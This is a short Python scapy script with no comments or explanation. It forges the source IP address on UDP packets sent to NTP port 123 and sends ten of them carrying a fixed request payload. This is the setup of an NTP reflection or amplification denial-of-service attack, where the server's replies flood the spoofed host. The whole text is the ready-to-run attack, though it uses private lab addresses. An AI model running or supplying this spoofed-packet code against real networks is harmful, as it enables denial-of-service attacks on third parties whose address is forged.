from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= "\x1b\x00\x02\x2a" + "\x00" * 44


spoofed_packet = IP(src=A, dst=B) / UDP(sport=random.randint(2000,65535), dport=123) / C
send(spoofed_packet, count=10)